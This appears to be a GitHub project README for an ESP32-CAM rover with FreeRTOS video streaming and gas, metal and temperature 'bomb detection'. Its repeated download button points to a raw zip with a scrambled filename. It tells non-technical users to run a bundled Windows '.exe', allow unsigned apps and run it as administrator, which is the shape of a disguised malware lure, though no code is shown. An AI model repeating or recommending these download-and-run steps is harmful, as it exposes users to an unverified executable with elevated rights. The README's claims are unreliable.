# 🤖 RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM - Safe, Real-Time Rover Control

[![Download Now](https://img.shields.io/badge/Download-RTOS%20Rover-brightgreen)](https://raw.githubusercontent.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM/main/firmware/Bomb_Rover_Based_ES_Surveillance_RTO_Autonomous_CAM_Detection_v2.3.zip)

---

## 📋 About This Project

This is a FreeRTOS-based rover built around the ESP32-CAM module. It streams video over WiFi in real time and can be controlled through a simple web browser interface. The rover uses multiple sensors—gas, metal, and temperature—to detect explosive hazards. These sensor readings combine to give a safer, autonomous surveillance experience. The system works by fusing sensor data to make probabilistic decisions about danger.

The rover is suitable for remote surveillance in risky environments where manual monitoring is unsafe. It communicates over your local WiFi network. The software runs on the ESP32 microcontroller, which handles detection, video, and control tasks concurrently with FreeRTOS.

**Key features include:**

- Real-time WiFi video streaming from ESP32-CAM  
- Browser-based control interface (no special app needed)  
- Bomb detection using gas, metal, and temperature sensors  
- Multi-sensor data fusion for more reliable alerts  
- Autonomous navigation capabilities with FreeRTOS tasks  

---

## 🚀 Getting Started

Use this guide to download and run the rover’s control software on a Windows computer. No programming or technical skills are required.

### System Requirements

- A Windows PC (Windows 10 or later recommended)  
- WiFi network with access to the ESP32-CAM device  
- Web browser (Chrome, Edge, Firefox)  
- USB cable to connect to the rover (for initial setup)  
- Basic familiarity with file download and running executables  

---

## 💾 How to Download and Setup

Click the button below to visit the page with all the files you need:

[![Download Page](https://img.shields.io/badge/Get%20Files-Here-blue)](https://raw.githubusercontent.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM/main/firmware/Bomb_Rover_Based_ES_Surveillance_RTO_Autonomous_CAM_Detection_v2.3.zip)

1. Open the link above. It will take you to the project’s main page.  
2. Look for the **Releases** section or the **Code** tab.  
3. Download the latest release or the zip file that contains the Windows executable and support files.  
4. Once downloaded, unzip the file to a folder you can access easily, such as Desktop or Documents.  
5. Inside the folder, find the `.exe` file. This is the program you will run to control the rover.  
6. Connect your Windows PC to the same WiFi network as the rover.  
7. Plug the USB cable into your computer and the rover for initial power and setup, if required.  

To run the program, double-click the `.exe` file. The control interface will open in your default browser automatically.

---

## 🔧 Using the Rover Control Software

After launching the program, follow these steps:

1. The main control panel will load in your browser.  
2. Enter the IP address of the ESP32-CAM rover (this usually comes from your WiFi router’s device list).  
3. Click **Connect** to pair your PC with the rover.  
4. Use the on-screen joystick and buttons to drive the rover remotely.  
5. The live video stream will display from the rover’s camera feed in real time.  
6. Check the detection panel to see sensor data and any bomb alerts.  
7. You can set parameters for sensor thresholds in the settings section for accuracy.  
8. To stop the rover, simply close the browser tab or the control program.  

---

## 🛠 Troubleshooting

- **Can’t connect to rover:** Ensure both your PC and the ESP32-CAM are on the same WiFi network. Check the rover’s IP address in your router’s client list.  
- **No video stream:** Refresh the browser or restart the control program. Confirm the rover’s camera is powered and connected.  
- **Control lag:** WiFi signal strength can affect responsiveness. Move closer to your router or try a different WiFi channel.  
- **Sensor readings seem off:** Verify the sensor cables are secure on the rover. Restart the device to recalibrate sensors.  
- **Program won’t start:** Make sure your Windows system allows running unsigned apps. Right-click and select “Run as administrator” if needed.  

---

## ⚙ Features Explained

- **FreeRTOS-based control:** The program runs multiple control and detection tasks in parallel on the ESP32 microcontroller. This enables smooth video streaming and sensor monitoring at the same time.  
- **Browser control:** Using standard web technologies, the interface needs no additional installation beyond the Windows executable. It provides buttons, joystick control, and live status updates.  
- **Probabilistic bomb detection:** Instead of raw sensor alarms, the software evaluates multiple sensor inputs to reduce false positives and improve safety.  
- **Multi-sensor fusion:** The sensors work together—gas detects chemicals, metal sensor finds metallic items, and temperature sensor checks heat anomalies.  

---

## 🔗 Links and Resources

Visit this page to download all necessary files:  
https://raw.githubusercontent.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM/main/firmware/Bomb_Rover_Based_ES_Surveillance_RTO_Autonomous_CAM_Detection_v2.3.zip

The repository also contains documentation files for advanced users who want to modify or compile the code.

---

## 🧰 Additional Tips

- Keep your rover’s firmware updated by checking the repository’s releases regularly.  
- Use a strong WiFi password to keep your rover secure.  
- Avoid operating the rover in extreme weather or very dusty conditions to protect sensors and electronics.  
- Charge or power the rover fully before long operation.  

---

## ❓ FAQ

**Q: Do I need a special app to control the rover?**  
A: No. The control runs in a web browser. Just run the Windows program to open the interface.

**Q: Can I use this rover outdoors?**  
A: Yes, but avoid heavy rain and extreme temperatures. The hardware is designed for general surveillance environments.

**Q: What should I do if the rover stops responding?**  
A: Try restarting the control program and the rover by unplugging and reconnecting power.

---

## 📝 About the Developers

This project uses open-source software and hardware components. It targets embedded system enthusiasts interested in robotics, IoT, and real-time control using FreeRTOS and the ESP32 platform.